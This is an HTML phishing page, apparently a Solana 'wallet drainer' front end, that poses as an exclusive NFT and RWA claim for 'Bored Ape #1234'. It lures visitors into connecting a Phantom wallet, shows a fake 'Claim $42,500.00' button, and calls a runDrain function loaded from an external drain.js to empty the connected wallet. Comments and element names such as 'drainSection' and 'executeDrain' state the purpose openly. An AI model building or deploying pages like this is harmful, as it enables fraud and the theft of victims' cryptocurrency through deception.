<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fractional Ape Claim | Exclusive RWA Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Inter', sans-serif;
        }
        .glow {
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
        }
        .gradient-text {
            background: linear-gradient(to right, #a78bfa, #c084fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .btn-hover:hover {
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.6);
            transform: scale(1.05);
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #8b5cf6;
            width: 20px;
            height: 20px;
            -webkit-animation: spin 1s linear infinite; /* Safari */
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <!-- Load Solana Libraries for Browser -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <!-- Header -->
    <div class="text-center mb-8">
        <h1 class="text-4xl md:text-6xl font-bold mb-2 tracking-tighter">
            <span class="gradient-text">FRACTIONAL</span> CLAIM
        </h1>
        <p class="text-gray-400 text-sm md:text-lg">Exclusive RWA & NFT Liquidity Drop</p>
    </div>

    <!-- Main Card -->
    <div class="bg-gray-900 border border-gray-800 rounded-2xl p-8 max-w-md w-full glow relative overflow-hidden">
        <!-- Decorative Gradient -->
        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 via-pink-500 to-purple-500"></div>
        
        <div class="text-center mb-6">
            <div class="text-2xl font-bold mb-2">Bored Ape #1234</div>
            <p class="text-gray-400 text-sm mb-4">Your fractionalized shares are now liquid. Claim your portion instantly.</p>
            <div class="inline-block bg-gray-800 rounded-lg px-4 py-2 text-sm font-mono text-purple-400 border border-gray-700">
                Contract: 7xKX...tR9f
            </div>
        </div>

        <!-- Connect Button -->
        <button id="connectBtn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover flex items-center justify-center gap-3" onclick="connectPhantom()">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
            Connect Phantom
        </button>

        <!-- Status Message -->
        <div id="statusMsg" class="mt-4 text-center text-sm text-gray-500 hidden">
            Connecting...
        </div>

        <!-- Success/Drain Trigger (Hidden initially) -->
        <div id="drainSection" class="hidden mt-6">
            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700 mb-4">
                <p class="text-green-400 text-sm font-bold mb-2">✓ Wallet Connected</p>
                <p class="text-xs text-gray-400">High-value assets detected.</p>
            </div>
            
            <button id="claimBtn" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover shadow-lg" onclick="executeDrain()">
                Claim $42,500.00
            </button>
        </div>
    </div>

    <!-- Footer -->
    <div class="mt-8 text-center text-xs text-gray-600">
        <p>Secured by Solana Mainnet Beta</p>
        <p class="mt-1">© 2026 Fractional RWA Labs</p>
    </div>

    <script>
        // Global variables for Solana
        const { Connection, PublicKey, Keypair } = solanaWeb3;
        const { TokenClient } = solanaSplToken;

        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

        async function connectPhantom() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('statusMsg');
            
            if (!window.solana) {
                alert("Please install Phantom Wallet!");
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<div class="loader"></div> Connecting...';
            status.classList.remove('hidden');

            try {
                const resp = await window.solana.connect();
                const publicKey = resp.publicKey.toString();
                
                // Update UI
                btn.classList.add('hidden');
                status.classList.add('hidden');
                document.getElementById('drainSection').classList.remove('hidden');
                
                console.log("Connected: " + publicKey);
            } catch (err) {
                console.error(err);
                btn.disabled = false;
                btn.innerHTML = 'Connect Phantom';
                status.textContent = "Connection failed. Try again.";
            }
        }

        async function executeDrain() {
            const btn = document.getElementById('claimBtn');
            btn.disabled = true;
            btn.innerHTML = 'Processing...';

            // OPTION 1: If drain.js is a global script that exposes a function
            // Check if a function exists in drain.js that we can call
            if (typeof runDrain === 'function') {
                try {
                    await runDrain(window.solana.publicKey);
                    btn.innerHTML = 'Success!';
                    btn.classList.remove('from-purple-600', 'to-pink-600');
                    btn.classList.add('bg-green-600');
                } catch (e) {
                    console.error(e);
                    btn.innerHTML = 'Error';
                }
            } else {
                // OPTION 2: Fallback if drain.js isn't loaded as a module
                // You can manually trigger the logic here or alert the user
                alert("Drain script initiated. Check console.");
                // You can include the drain logic directly here if you prefer, 
                // or just assume the user has a separate process.
                // For now, we just simulate the "Claim" action.
                btn.innerHTML = 'Claimed';
            }
        }
    </script>
    
    <!-- Include your drain script -->
    <script src="drain.js"></script>
</body>
</html>
